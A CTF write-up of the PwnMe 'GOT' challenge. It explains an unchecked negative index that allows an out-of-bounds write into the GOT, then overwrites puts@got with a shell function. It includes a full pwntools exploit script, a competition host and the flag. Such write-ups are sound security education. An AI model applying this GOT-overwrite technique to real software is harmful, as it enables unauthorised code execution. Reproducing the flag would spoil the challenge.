---
title: PWNMECTF PWNABLE

---

# PWNMECTF PWNABLE
### Introduction:
- This is a write-up of GOT challenge by HiuHiu.
## IDA
- Main function:
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int idx; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  idx = 0;
  puts("Hey ! I've never seen Game of Thrones and i think i misspelled a name, can you help me ?");
  puts("Which name is misspelled ?\n1. John\n2. Daenarys\n3. Bran\n4. Arya");
  fwrite("> ", 1uLL, 2uLL, stdout);
  __isoc99_scanf("%d", &idx);
  if ( idx > 4 )                                // OOB-able
  {
    puts("Huuuhhh, i do not know that many people yet...");
    _exit(0);
  }
  puts("Oh really ? What's the correct spelling ?");
  fwrite("> ", 1uLL, 2uLL, stdout);
  read(0, &PNJs[idx], 32uLL);
  puts("Thanks for the help, next time i'll give you a shell, i already prepared it :)");
  return 0;
}
```
> Firstly, we are required to enter the index as the idx of each name listed, including: "John, Daenarys, Bran, Arya".
> Then this input is checked if the its value is greater than 4 for the correction requirement of the names based on the index or an exit. 
- Shell function:
```
void __cdecl shell()
{
  system("/bin/sh");
}
```
> Basically is our target =))

## IDEA
- With the check of the index we could find an OutOfBound bug because the index was check only with the value of 4 (greater) while there is no limit for the lower 0 index. With that in mind, we will use the bug to invest the data of those stage of memory and find the way for exploitation.

## EXPLOIT
- Checksec
> ![{3C0EF49A-B230-437E-840D-4FB96F17AEB4}](https://hackmd.io/_uploads/S1jqwN7okg.png)
> Pay attention on PIE (off) and RELRO (partial) -> function can be called easily and the got table can be overwrited

- GDB
> Have a test with idx = 0:
> ![{ADFE6F67-66BF-4142-A0DE-DEB66A374C4A}](https://hackmd.io/_uploads/B1jZY4Xiyl.png)
> We can see that our idx is read on the stack at 0x7fffffffde24 and then it is moved in the eax and converted to the form of 8 bytes. Then it is shifted to the left 5 bytes and the result is as the result of the multiplication of the idx and 2 power 5 (idx * 2^5), following by the PNJs address added (0x404080). Finally, based on the above result in the rax, we are asked to have the input and it will be stored in the result.
> - We can have the formula: idx * 0x20 = result (where the input will be writen).
> - With that formula, with the idx, the address we write is 0x20 byte in distance and we are able to write at 0x404080 + (idx * 0x20).
> - Let have the investigating at the lower addresses from PNJs + 0:
> ![{05E3AA23-DE66-4540-9A37-FD31289B9DEC}](https://hackmd.io/_uploads/S1_ts47s1l.png)
> - And we got the GOT table here. The idea will be completed with the overwrite of a GOT address satisfying the formula by the Shell function address.
> - We can realize that we can only write at exit and read fuction. Have a look back to IDA to check if it is possible for this overwrite to have its meanning:
> ```
> puts("Oh really ? What's the correct spelling ?");
> fwrite("> ", 1uLL, 2uLL, stdout);
> read(0, &PNJs[idx], 32uLL);
> puts("Thanks for the help, next time i'll give you a shell, i already prepared it :)");
> return 0;
> ```
> - After the read function is called, the only remaining function is puts and puts' address is not reasonable for our formula.
> - So how can we do now??? Just chill here=))) You're all forgot 1 thing is the input for correction have the size of 32 bytes. 
> "But HiuHiu what can we do with that?"
> - Alright, we will have the exit@plt overwited by 8 bytes from our input right? And the size of input is 32. It means we can overwrite the 3 lower functions in the GOT table and see what? puts@plt is just below the exit one.
> **=> So the solutions is our input will includes 16 bytes with 8 first bytes is random and the remaining is the address of Shell function.**
- Script:
> What are you waiting for? Go having the script written like this:
> ```
> sla(b'> ',b'-4')
> payload = b'a'*8 + p64(exe.sym.shell)
> sla(b'?\n> ',payload)
> p.interactive()
> ```
> Just simple like that and have a run:
> ![{717F17A7-9D2D-45AE-A2DC-0B61DA885FDB}](https://hackmd.io/_uploads/Skhs1Bmsye.png)
> We had the local flag and now it's time for the server:
> ![{CCE33E89-197D-486E-8474-2A19418A1DD3}](https://hackmd.io/_uploads/H1U0yrmjkg.png)
> Oh Oh, the server seemed to be closed due to the end of the competition but don't worry i got it noted in my script.

**=> Challenge completed**

## FULLSCRIPT
```
#!/usr/bin/env python3

from pwn import *

exe = ELF('got', checksec=False)
# libc = ELF('', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.p.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+120
        b*main+243
        c
        ''')
        input()


if args.REMOTE:
    p = remote('got-0f2e3f0dab2a139f.deploy.phreaks.fr',443,ssl = True)
else:
    p = process([exe.path])
GDB()

#using OOB to access to exit got and the formula is: index*0x20 + 0x404080(an address of rw section)
#idx = -4: with the idx so now the address accessed is 0x404080 + (-4*0x20) = 0x404000 is the exit()

sla(b'> ',b'-4')
payload = b'a'*8 + p64(exe.sym.shell)
sla(b'?\n> ',payload)
p.interactive()

#flag: PWNME{G0t_Ov3Rwr1t3_fTW__}
```